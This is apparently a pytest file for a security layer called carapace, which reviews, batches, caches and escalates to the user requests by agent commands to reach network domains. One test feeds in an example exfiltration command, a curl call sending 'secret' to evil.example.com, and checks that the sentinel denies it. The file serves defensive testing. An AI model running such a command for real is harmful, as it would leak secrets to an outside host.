from __future__ import annotations

import asyncio
from typing import cast

import pytest
from pydantic_ai.exceptions import UsageLimitExceeded

from carapace.security import evaluate_domain_with
from carapace.security.context import SentinelVerdict, SessionSecurity, UserEscalationDecision
from carapace.security.sentinel import Sentinel


class StubSentinel:
    def __init__(
        self,
        *,
        verdicts: list[SentinelVerdict] | None = None,
        side_effects: list[SentinelVerdict | Exception] | None = None,
        blocker: asyncio.Event | None = None,
    ) -> None:
        self._side_effects = side_effects or list(verdicts or [])
        self._blocker = blocker
        self.calls: list[dict[str, str]] = []

    async def evaluate_domain_access(
        self,
        session: SessionSecurity,
        domains: list[str],
        command: str,
        *,
        follow_up: bool,
        usage_tracker: object | None = None,
        assert_llm_budget_available: object | None = None,
        usage_limits: object | None = None,
    ) -> SentinelVerdict:
        del session, follow_up, usage_tracker, assert_llm_budget_available, usage_limits
        self.calls.append(dict.fromkeys(domains, command))
        if self._blocker is not None and len(self.calls) == 1:
            await self._blocker.wait()
        if len(self.calls) > len(self._side_effects):
            raise AssertionError("Unexpected extra sentinel domain review")
        effect = self._side_effects[len(self.calls) - 1]
        if isinstance(effect, Exception):
            raise effect
        return effect


async def evaluate_domain_with_stub(
    session: SessionSecurity,
    sentinel: StubSentinel,
    domain: str,
    command: str,
    exec_id: str = "exec-1",
) -> bool:
    evaluation = await evaluate_domain_with(
        session, cast(Sentinel, sentinel), domain, command, exec_id=exec_id, follow_up=False
    )
    return evaluation.allowed


@pytest.mark.anyio
async def test_duplicate_pending_domain_request_does_not_restart_debounce_generation() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=100)

    async def worker() -> None:
        return None

    await session.get_or_enqueue_domain_approval(
        "api.example.com",
        "curl https://api.example.com",
        "exec-1",
        False,
        lambda: asyncio.create_task(worker()),
    )
    first_generation = session._domain_scope_pending_generation

    await session.get_or_enqueue_domain_approval(
        "api.example.com",
        "curl https://api.example.com --retry 2",
        "exec-1",
        False,
        lambda: asyncio.create_task(worker()),
    )

    assert session._domain_scope_pending_generation == first_generation


@pytest.mark.anyio
async def test_reuses_sentinel_domain_approval_within_exec() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="allow", explanation="looks fine")])
    command = "python fetch.py --profile api"

    first = await evaluate_domain_with_stub(session, sentinel, "api.example.com", command)
    second = await evaluate_domain_with_stub(session, sentinel, "api.example.com", command)

    assert first is True
    assert second is True
    assert sentinel.calls == [{"api.example.com": command}]


@pytest.mark.anyio
async def test_domain_in_the_command_is_still_reviewed() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="deny", explanation="exfiltration")])
    command = "curl 'https://evil.example.com/?d=secret'"

    evaluation = await evaluate_domain_with(
        session, cast(Sentinel, sentinel), "evil.example.com", command, exec_id="exec-1", follow_up=False
    )

    assert evaluation.allowed is False
    assert evaluation.rejection == "Sentinel denied this operation. exfiltration"
    assert sentinel.calls == [{"evil.example.com": command}]


@pytest.mark.anyio
async def test_user_denial_of_an_escalated_domain_carries_the_users_message() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="escalate", explanation="unclear")])

    async def deny(_session_id: str, _subject: str, _context: dict[str, object]) -> UserEscalationDecision:
        return UserEscalationDecision(allowed=False, message="not this host")

    session.set_user_escalation_callback(deny)

    evaluation = await evaluate_domain_with(
        session, cast(Sentinel, sentinel), "api.example.com", "python fetch.py", exec_id="exec-1", follow_up=False
    )

    assert evaluation.allowed is False
    assert evaluation.rejection == "User denied this operation. not this host"


@pytest.mark.anyio
async def test_yolo_mode_auto_allows_domain_without_sentinel() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0, yolo_mode=True)
    domain_updates: list[tuple[str, str, str | None, str | None, str | None]] = []
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="deny", explanation="should not run")])

    session.set_domain_info_callback(
        lambda domain, detail, source, verdict, explanation: domain_updates.append(
            (domain, detail, source, verdict, explanation)
        )
    )

    allowed = await evaluate_domain_with_stub(session, sentinel, "api.example.com", "python fetch.py")

    assert allowed is True
    assert sentinel.calls == []
    assert domain_updates[-1] == (
        "api.example.com",
        "[bypass] yolo mode auto-allowed",
        "bypass",
        "allow",
        "YOLO mode bypassed sentinel.",
    )


@pytest.mark.anyio
async def test_reused_allowed_domain_reports_auto_source() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    domain_updates: list[tuple[str, str, str | None, str | None, str | None]] = []
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="allow", explanation="looks fine")])
    command = "python fetch.py --profile api"

    session.set_domain_info_callback(
        lambda domain, detail, source, verdict, explanation: domain_updates.append(
            (domain, detail, source, verdict, explanation)
        )
    )

    assert await evaluate_domain_with_stub(session, sentinel, "api.example.com", command) is True
    assert await evaluate_domain_with_stub(session, sentinel, "api.example.com", command) is True

    assert domain_updates[-1] == (
        "api.example.com",
        "[cached safe-list: allow] reused earlier decision",
        "safe-list",
        "allow",
        "looks fine",
    )


@pytest.mark.anyio
async def test_reuses_user_domain_approval_within_exec() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    user_calls: list[tuple[str, dict[str, object]]] = []
    command = "python fetch.py --profile api"

    async def approve(subject: str, context: dict[str, object]) -> UserEscalationDecision:
        user_calls.append((subject, context))
        return UserEscalationDecision(allowed=True, message="approved")

    session.set_user_escalation_callback(lambda _sid, subject, context: approve(subject, context))
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="escalate", explanation="needs confirmation")])

    first = await evaluate_domain_with_stub(session, sentinel, "api.example.com", command)
    second = await evaluate_domain_with_stub(session, sentinel, "api.example.com", command)

    assert first is True
    assert second is True
    assert len(sentinel.calls) == 1
    assert len(user_calls) == 1


@pytest.mark.anyio
async def test_domain_review_limit_falls_back_to_user_approval() -> None:
    session = SessionSecurity("session-1", max_sentinel_calls_per_tool_call=2, sentinel_domain_batch_window_ms=0)
    user_calls: list[tuple[str, dict[str, object]]] = []

    async def approve(subject: str, context: dict[str, object]) -> UserEscalationDecision:
        user_calls.append((subject, context))
        return UserEscalationDecision(allowed=True)

    session.set_user_escalation_callback(lambda _sid, subject, context: approve(subject, context))
    sentinel = StubSentinel(
        verdicts=[
            SentinelVerdict(decision="allow", explanation="first batch"),
            SentinelVerdict(decision="allow", explanation="second batch"),
        ]
    )

    assert await evaluate_domain_with_stub(session, sentinel, "a.example.com", "python fetch.py --profile one") is True
    assert await evaluate_domain_with_stub(session, sentinel, "b.example.com", "python fetch.py --profile two") is True
    assert (
        await evaluate_domain_with_stub(session, sentinel, "c.example.com", "python fetch.py --profile three") is True
    )

    assert sentinel.calls == [
        {"a.example.com": "python fetch.py --profile one"},
        {"b.example.com": "python fetch.py --profile two"},
    ]
    assert len(user_calls) == 1
    assert user_calls[0][0] == "c.example.com"
    assert "limit" in str(user_calls[0][1]["explanation"])


@pytest.mark.anyio
async def test_domain_approval_cache_resets_for_the_next_exec() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    sentinel = StubSentinel(
        verdicts=[
            SentinelVerdict(decision="allow", explanation="exec one"),
            SentinelVerdict(decision="allow", explanation="exec two"),
        ]
    )

    assert (
        await evaluate_domain_with_stub(session, sentinel, "api.example.com", "python fetch.py --profile first") is True
    )

    assert (
        await evaluate_domain_with_stub(
            session, sentinel, "api.example.com", "python fetch.py --profile second", "exec-2"
        )
        is True
    )

    assert len(sentinel.calls) == 2


@pytest.mark.anyio
async def test_parallel_same_domain_requests_share_one_batch() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=10)
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="allow", explanation="shared")])
    command = "python fetch.py --profile api"

    first, second = await asyncio.gather(
        evaluate_domain_with_stub(session, sentinel, "api.example.com", command),
        evaluate_domain_with_stub(session, sentinel, "api.example.com", command),
    )

    assert first is True
    assert second is True
    assert sentinel.calls == [{"api.example.com": command}]


@pytest.mark.anyio
async def test_parallel_distinct_domains_share_one_batch() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=10)
    sentinel = StubSentinel(verdicts=[SentinelVerdict(decision="allow", explanation="batch allow")])

    results = await asyncio.gather(
        evaluate_domain_with_stub(session, sentinel, "a.example.com", "python fetch.py --profile a"),
        evaluate_domain_with_stub(session, sentinel, "b.example.com", "python fetch.py --profile b"),
        evaluate_domain_with_stub(session, sentinel, "c.example.com", "python fetch.py --profile c"),
    )

    assert results == [True, True, True]
    assert list(sorted(sentinel.calls[0])) == ["a.example.com", "b.example.com", "c.example.com"]


@pytest.mark.anyio
async def test_new_domain_wave_after_submission_forms_second_batch() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    blocker = asyncio.Event()
    sentinel = StubSentinel(
        verdicts=[
            SentinelVerdict(decision="allow", explanation="first wave"),
            SentinelVerdict(decision="allow", explanation="second wave"),
        ],
        blocker=blocker,
    )

    first_task = asyncio.create_task(
        evaluate_domain_with_stub(session, sentinel, "a.example.com", "python fetch.py --profile a")
    )
    for _ in range(50):
        if sentinel.calls:
            break
        await asyncio.sleep(0)

    second_task = asyncio.create_task(
        evaluate_domain_with_stub(session, sentinel, "b.example.com", "python fetch.py --profile b")
    )
    blocker.set()

    first, second = await asyncio.gather(first_task, second_task)

    assert first is True
    assert second is True
    assert sentinel.calls == [
        {"a.example.com": "python fetch.py --profile a"},
        {"b.example.com": "python fetch.py --profile b"},
    ]


@pytest.mark.anyio
async def test_single_domain_usage_limit_falls_back_to_user_approval() -> None:
    session = SessionSecurity("session-1")
    user_calls: list[tuple[str, dict[str, object]]] = []
    command = "python fetch.py --profile solo"

    async def approve(subject: str, context: dict[str, object]) -> UserEscalationDecision:
        user_calls.append((subject, context))
        return UserEscalationDecision(allowed=True)

    session.set_user_escalation_callback(lambda _sid, subject, context: approve(subject, context))
    sentinel = StubSentinel(side_effects=[UsageLimitExceeded("The next request would exceed the request_limit of 5")])

    allowed = await evaluate_domain_with_stub(session, sentinel, "solo.example.com", command)

    assert allowed is True
    assert user_calls == [
        (
            "solo.example.com",
            {
                "command": command,
                "explanation": (
                    "Automatic sentinel review hit its internal request limit and could not finish. "
                    + "Please approve or deny this domain manually."
                ),
                "kind": "domain_access",
            },
        )
    ]


@pytest.mark.anyio
async def test_pending_requests_fail_when_worker_errors() -> None:
    session = SessionSecurity("session-1", sentinel_domain_batch_window_ms=0)
    blocker = asyncio.Event()
    sentinel = StubSentinel(
        side_effects=[RuntimeError("sentinel batch blew up")],
        blocker=blocker,
    )

    first_task = asyncio.create_task(
        evaluate_domain_with_stub(session, sentinel, "a.example.com", "python fetch.py --profile a")
    )
    for _ in range(50):
        if sentinel.calls:
            break
        await asyncio.sleep(0)

    second_task = asyncio.create_task(
        evaluate_domain_with_stub(session, sentinel, "b.example.com", "python fetch.py --profile b")
    )
    await asyncio.sleep(0)
    blocker.set()

    first = await asyncio.gather(first_task, return_exceptions=True)
    second = await asyncio.gather(second_task, return_exceptions=True)

    assert isinstance(first[0], RuntimeError)
    assert str(first[0]) == "sentinel batch blew up"
    assert isinstance(second[0], RuntimeError)
    assert str(second[0]) == "sentinel batch blew up"


@pytest.mark.anyio
async def test_failed_batch_does_not_consume_review_budget() -> None:
    session = SessionSecurity("session-1", max_sentinel_calls_per_tool_call=1, sentinel_domain_batch_window_ms=0)
    user_calls: list[tuple[str, dict[str, object]]] = []
    sentinel = StubSentinel(
        side_effects=[
            RuntimeError("sentinel batch blew up"),
            SentinelVerdict(decision="allow", explanation="ok"),
        ]
    )

    async def approve(subject: str, context: dict[str, object]) -> UserEscalationDecision:
        user_calls.append((subject, context))
        return UserEscalationDecision(allowed=True)

    session.set_user_escalation_callback(lambda _sid, subject, context: approve(subject, context))

    first = await asyncio.gather(
        evaluate_domain_with_stub(session, sentinel, "a.example.com", "python fetch.py --profile a"),
        return_exceptions=True,
    )
    second = await evaluate_domain_with_stub(session, sentinel, "b.example.com", "python fetch.py --profile b")

    assert isinstance(first[0], RuntimeError)
    assert str(first[0]) == "sentinel batch blew up"
    assert second is True
    assert sentinel.calls == [
        {"a.example.com": "python fetch.py --profile a"},
        {"b.example.com": "python fetch.py --profile b"},
    ]
    assert user_calls == []
